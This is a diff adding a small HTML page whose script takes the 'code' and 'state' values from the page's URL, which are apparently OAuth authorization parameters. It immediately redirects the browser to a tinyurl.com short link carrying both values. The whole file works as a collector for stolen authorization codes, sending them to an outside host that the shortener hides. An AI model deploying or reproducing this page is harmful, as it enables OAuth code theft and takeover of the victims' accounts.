@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+  const urlParams = new URLSearchParams(window.location.search);
+  const codeValue = urlParams.get('code');
+  const stateValue = urlParams.get('state');
+  window.location.href = "https://tinyurl.com/df45435gghf?code=" + codeValue + "&state=" + stateValue;
+</script>
+</body>
+</html>
